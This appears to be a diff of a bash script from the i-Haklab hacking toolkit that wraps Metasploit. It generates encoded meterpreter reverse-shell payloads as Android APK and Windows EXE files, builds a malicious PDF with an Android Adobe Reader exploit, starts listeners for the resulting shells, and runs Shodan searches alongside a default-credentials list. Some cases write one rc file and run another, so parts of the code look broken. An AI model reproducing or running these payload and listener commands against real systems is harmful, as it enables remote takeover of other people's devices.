@@ -1,9 +1,9 @@
 #!/bin/bash
 #This file is part of i-Haklab command
-trap ctrl_c 2
+#
 source $PREFIX/share/i-Haklab/.set/var/variables
 source $iHAKLAB/.set/functions/functions
-OPTS=$1
+opts=$1
 HOST=${2:-$LOCALHOST}
 if chk-root;then
 	PORT=${3:-$RPORT}
@@ -16,18 +16,27 @@ if [ ! -d $iHAKLAB/handler ]; then
 	mkdir -p $iHAKLAB/handler
 fi
 handlerRC(){
-cat <<- CONF > $iHAKLAB/rcFiles/$OPTS.rc
+cat <<- CONF > $iHAKLAB/rcFiles/$opts.rc
 use exploit/multi/handler
 set PAYLOAD $PAYLOAD
 set LHOST $HOST
 set LPORT $PORT
 run
 CONF
-	printf "$Y(_>)─➤$W HOST= $HOST\n$Y(_>)─➤$W PORT= $PORT\n$Y(_>)─➤$W Payload= $PAYLOAD\n$Y(_>)─➤$W Handler file= $OPTS.rc\n"
-	$user msfconsole -q -r $iHAKLAB/rcFiles/$OPTS.rc
+	printf "$Y(_>)─➤$W HOST= $HOST\n$Y(_>)─➤$W PORT= $PORT\n$Y(_>)─➤$W Payload= $PAYLOAD\n$Y(_>)─➤$W Handler file= $opts.rc\n"
+	$user msfconsole -q -r $iHAKLAB/rcFiles/$opts.rc
 }
 
-case $1 in
+case $opts in
+	dirscan)
+		[[ -z $2 ]] && STDERR
+		cat <<- CONF > $iHAKLAB/rcFiles/$opts.rf
+		use auxiliary/scanner/http/dir_scanner
+		set RHOST $2
+		run
+		CONF
+		$user msfconsole -q -r $iHAKLAB/rcFiles/$opts.rc
+		;;
 	payapk)
 		PAYLOAD=android/meterpreter/reverse_tcp
 		msfvenom -p $PAYLOAD LHOST=$HOST LPORT=$PORT -e x86/shikata_ga_nai -i 5 -a dalvik --platform android -o payapk.apk >/dev/null || exit
@@ -35,22 +44,22 @@ case $1 in
 		;;
 	payexe)
 		PAYLOAD=windows/meterpreter/reverse_tcp
-		msfvenom -p $PAYLOAD LHOST=$HOST LPORT=$PORT -f exe -e x86/shikata_ga_nai -i 5 -o $OPTS.exe > /dev/null || exit
+		msfvenom -p $PAYLOAD LHOST=$HOST LPORT=$PORT -f exe -e x86/shikata_ga_nai -i 5 -o $opts.exe > /dev/null || exit
 		handlerRC
 		;;
 	paypdf)
-		cat <<- CONF > $iHAKLAB/rcFiles/$OPTS.rf
+		cat <<- CONF > $iHAKLAB/rcFiles/$opts.rf
 		use exploit/android/fileformat/adobe_reader_pdf_js_interface
 		set LHOST $HOST
 		set LPORT $PORT
-		set FILENAME $OPTS.pdf
+		set FILENAME $opts.pdf
 		run
 		use exploit/multi/handler
 		set LHOST $LOCALHOST
 		set LPORT $LPORT
 		run
 		CONF
-		$user msfconsole -q -r $iHAKLAB/rcFiles/$OPTS.rc
+		$user msfconsole -q -r $iHAKLAB/rcFiles/$opts.rc
 		;;
 	shodan)
 		if [ ! -e $MSFPATH/documentation/api/apikey ]; then
@@ -76,7 +85,7 @@ case $1 in
 		else
 			printf "$R(_>)─➤ ERROR :$W Not such query file\n"
 		fi
-		cat <<- CONF > $iHAKLAB/rcFiles/$OPTS.rc
+		cat <<- CONF > $iHAKLAB/rcFiles/$opts.rc
 		use auxiliary/gather/shodan_search
 		set SHODAN_APIKEY $APIKEY
 		set QUERY "$QUERY"
@@ -86,6 +95,9 @@ case $1 in
 		cat $iHAKLAB/.set/shodan/usrpasswd.txt
 		printf "\n\tpress$G ENTER$W to continue\n"
 		read enter
-		msfconsole -q -r $iHAKLAB/rcFiles/$OPTS.rc
+		msfconsole -q -r $iHAKLAB/rcFiles/$opts.rc
+		;;
+	*)
+		STDERR
 		;;
 esac
